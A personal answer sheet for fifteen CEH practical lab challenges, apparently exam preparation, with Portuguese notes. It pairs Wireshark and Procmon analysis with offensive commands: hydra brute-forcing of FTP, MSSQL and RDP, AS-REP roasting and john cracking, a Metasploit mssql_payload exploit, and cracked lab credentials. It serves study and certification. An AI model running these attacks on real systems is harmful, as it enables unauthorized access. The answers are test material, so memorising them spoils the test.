#------------------------------#


# PART II - Challenge 1  💬ANSWER: https://www.crushftp.com/💬
nmap -p 21 --open -iL ~/anotacoes/1_2.txt
nmap -sV -p 21 192.168.10.144 192.168.10.222
# nmap -sV -A -p 21 192.168.10.144 192.168.10.222
# nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.10.144 192.168.10.222
find ~ -type f -iname 'passwords.txt'
hydra -l nick -P ~/Desktop/password.txt ftp://192.168.10.111
### INFO: [21] [ftp] host: 192.168.10.111 login: nick password: apple

ftp 192.168.10.111 
### USERNAME: nick
### PASSWORD: apple
#### ~/Desktop/52012.py
ls  # CONECTADO VIA FTP
get 52012.py
exit
grep www 52012.py

## 🗒️ NOTES
echo -e "https://www.crushftp.com\nUSER: nick\nPASS: apple" > ~/anotacoes/2_1.txt
cat ~/anotacoes/2_1.txt


#------------------------------#


# PART II - Challenge 2 💬ANSWER: kety/apple💬
#### C:\Users\Admin\Downloads\MScredremote.pcapng
### FILTER: http.request.method == POST
#### INFO: POST / HTTP/1.1 (application/x-www-form-urlencoded)
#### HTML Form URL Encoded: application/x-www-form-urlencoded
####    Form item: "txtusername" == "kety"
####    Form item: "txtpwd" == "apple"

# ⚠️ COMANDOS IMPORTANTES
### FILTER: http.request.method == "POST" && http contains "pwd"
### FILTER: http contains "username" || http contains "password"
### PATH: Statistics → Conversations → TCP
### PATH: Follow → HTTP Stream

## 🗒️ NOTES
echo -e "Mscredremote.pcapng\nUSER: kety\nPASS: apple" > ~/anotacoes/2_2.txt
cat ~/anotacoes/2_2.txt


#------------------------------#


# PART II - Challenge 3  💬ANSWER: Quake Network Protocol💬
#### ~/Downloads/ServerDoS.pcapng
wireshark ~/Downloads/ServerDoS.pcapng
#### INFO: 9850 → 26000 Len=0  # Muitos pacotes vazios chegando em 26000/UDP
#### User Datagram Protocol, Src Port: 9850, Dst Port: 26000
#### GOOGLE: 26000 udp protocol 

# ⚠️ COMANDOS IMPORTANTES
#### FILTER: udp
#### FILTER: udp.dstport == 26000
### PATH: Statistics → Endpoints → UDP
### PATH: Statistics → Conversations → UDP
### PATH: Statistics → IO Graphs
### PATH: <BOTÃO DIREITO MOUSE NO PACOTE> → Decode As...


#------------------------------#


# PART II - Challenge 4  💬ANSWER: 192.168.10.144💬
#### ~/Documents/DD_attack.pcapng
wireshark ~/Documents/DD_attack.pcapng
### PATH: Statistics → Endpoints → UDP
### INFO: 192.168.10.144 # Envio médio de 1000 pacotes em múltiplas portas altas (de 49900 a 49999) utilizadas. UDP Flood com varredura de portas altas.

# ⚠️ COMANDOS IMPORTANTES
### FILTER: udp
#### FILTER: udp && ip.src == 192.168.10.144
#### FILTER: udp && ip.src == 192.168.10.144 && udp.dstport >= 49900 && udp.dstport <= 49999
### PATH: Statistics → Endpoints → UDP
### PATH: Statistics → Conversations → UDP
### PATH: Statistics → IO Graphs


#------------------------------#


# PART II - Challenge 5  💬ANSWER: 172.30.10.99💬
#### ~/Downloads/PyD_attack.pcapng
wireshark ~/Downloads/PyD_attack.pcapng
### FILTER: tcp.port == 135
### PATH: Statistics → Endpoints → TCP
#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 0
#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
#### FILTER: tcp.port == 135 && tcp.flags.reset == 1
### INFO: 172.30.10.99 # Esse IP é origem na comunição pela porta 135 (inicio de comunicação por RPC) para o destino 192.168.0.222

# ⚠️ COMANDOS IMPORTANTES
### FILTER: tcp.port == 135
#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 0
#### FILTER: tcp.port == 135 && tcp.flags.syn == 1 && tcp.flags.ack == 1
#### FILTER: tcp.port == 135 && tcp.flags.reset == 1
### PATH: Statistics → Endpoints → TCP
### PATH: Statistics → Conversations → TCP


#------------------------------#


# PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 
#### C:\Users\Admin\Documents\Anti-DDoS\report export.txt
#### C:\Users\Admin\Documents\Anti-DDoS\rec001.txt
#### C:\Users\Admin\Documents\Anti-DDoS\rec002.txt  
cd 'C:\Users\Admin\Documents\Anti-DDoS\'
notepad '.\rec001.txt' # CONFIRMAÇÃO DO VOLUME (COMPORTAMENTO)
notepad '.\rec002.txt' # CONTEXTO DO ATAQUE (COMO FOI FEITO) # Mostra diversos cabeçalho, todos com Hosts: 192.168.10.144:135 (RPC)
notepad '.\report export.txt' # VISÃO MACRO (QUEM MAIS ATACOU)
### INFO: No. → 37, Outgoing bytes → 741444(Blocked), Incoming bytes → 13481074(Blocked)
### INFO: Local IP Address → 192.168.10.144, Port → 135
### INFO: Remote IP Address → 192.168.10.222, Port → 5486

# Get-Content '.\report export.txt'
# Get-Content '.\rec001.txt'
# Get-Content '.\rec002.txt'
# more '.\report export.txt'
# more '.\rec001.txt'
# more '.\rec002.txt'



#------------------------------#


# PART II - Challenge 7  💬ANSWER: c3ll0@123💬
find ~ -type f -name '*.py' | grep GetNPUsers
GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
nc -vz 192.168.0.222 88 # Verificar serviço Kerberos, porta 88, para ver se há AS-REP (resposta do Kerberos)
nc -vz 192.168.0.222 445 # Verificar serviço SMB, porta 445, para ver se DC ativo
nc -vz 192.168.0.222 135 # Verificar serviço RPC, porta 135, para ver se é infra Windows
### INFO: Hashe "Joshua@SKILL.CEH:cbd0830...." 
nano hash_founded.txt # Salvar a hashe "cbd0830...."
find ~ -type f -name 'rockyou.txt'
john --wordlist=~/rockyou.txt hash_founded.txt
### INFO: c3ll0@123 (?)


#------------------------------#


# PART II - Challenge 8  💬ANSWER: 7💬
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
find / -type f -name 'mssqlclient.py' 2>/dev/null
mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
# mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
msfconsole -q -x "
search mssql;
use exploit/windows/mssql/mssql_payload;
info;
show options;
set RHOST 192.168.10.144;
set USERNAME Server_mssrv;
set PASSWORD Spidy;
set DATABASE msdb;
show payloads;
show targets;
show advanced;
exploit;"
# cd C:\\Users\\Public\\Downloads\\
dir 
### INFO: Name → MSS.txt, Size → 7


#------------------------------#


# PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4 
# hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp
### INFO: [3389] [rdp] host: 192.168.10.222 login: Administrator password: Passw0rd@123
### INFO: [3389] [rdp] host: 192.168.10.222 login: AdminDC password: @dmin@admin
### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234


#------------------------------#


# PART II - Challenge 10  💬ANSWER: d282💬
#### ~/Downloads/Tools.rar
sha256sum ~/Downloads/Tools.rar | awk '{print substr($1,length($1)-3)}'
sha256sum ~/Downloads/Tools.rar


#------------------------------#


# PART II - Challenge 11 💬ANSWER: 6952💬
#### ~/Pictures/Logfile.PML
cd ~/Pictures
python3 -m http.server 8000
ifconfig

#### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # Baixar Logfile.PML
#### C:\Users\Admin\Downloads\Logfile.PML
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor\Procmon.exe # Abrir Logfile.PML com essa ferramenta
### PATH: Procmon.exe → File → Open → C:\Users\Admin\Downloads\Logfile.PML
### PATH: Filter → Filter... (Ctrl + L) → 
###                                        Process Name is H3ll0.exe → Include
###                                        Operation is Process Create → Include
###                                        Operation is Process Profiling → Include
### INFO: Time | Process Name | PID | Operation | Path | Result | Detail
### INFO: Operation → Process Create # Processo foi criado, Contém Parent PID ⭐
### INFO: Operation → Process Profiling # Processo começou a executar, Contém Parent PID ⭐
### INFO: Operation → TCP Connect / TCP Reconnect / TCP Disconnect # Comunicação de Rede, nesse caso contém Parent PID ⭐. No entanto: ⚠️ Não é confiável. ⚠️ Não é o método esperado pela prova CEH. 
### PATH: Event Properties → Process → Parent PID → 6952


#------------------------------#


# PART II - Challenge 12 💬ANSWER: 2.87💬
#### ~/Downloads/Tornado
sudo apt install ent -y
ent ~/Downloads/Tornado
### INFO: Entropy = 2.878860 bits per byte.

# cd ~/Downloads
# python3 -m http.server 8000
#### GOOGLE-CHROME - WORKSATION-1: http://172.25.0.10:8000 # Baixar Tornado
#### C:\Users\Admin\Downloads\Tornado
#### E:\CEH-Tools\CEHv13 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE\die.exe # Abrir Tornado com essa ferramenta
### File name → ... → Open file... → C:\Users\Admin\Downloads\Tornado → Entropy
### INFO: Total → 2.87903


#------------------------------#


# PART II - Challenge 13 💬ANSWER: 192.168.10.144💬
nmap -p 2002 -iL ~/anotacoes/1_2.txt --open
nmap -p 2002 -sV 192.168.10.144
### INFO: 2002/tcp open rpcapd WinPcap remote packet capture daemon
### INFO: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
# nc 192.168.10.144 2002 -vvv


#------------------------------#


# PART II - Challenge 14 💬ANSWER: 3965222💬
#### ~/Desktop/stealth.jpeg
steghide info ~/Desktop/stealth.jpeg -p azerty@123
steghide extract -sf ~/Desktop/stealth.jpeg -p azerty@123 -q 
# steghide extract -sf ~/Desktop/stealth.jpeg -xf output.txt
cat hidden.txt
# open hidden.txt
### INFO: Tender quote for techiquest event 2024: 3965222


#------------------------------#


# PART II - Challenge 15 💬ANSWER: android/dos/46445.c💬
searchsploit AirDrop 2.0
### INFO: AirDrop 2.0 - Denial of Service (DoS) android/dos/46445.c

# searchsploit -p -w "AirDrop 2.0" # Mostra o caminho completo; Busca por string exata 
# searchsploit -m 46445 # Copia para o o exploit para o diretório atual 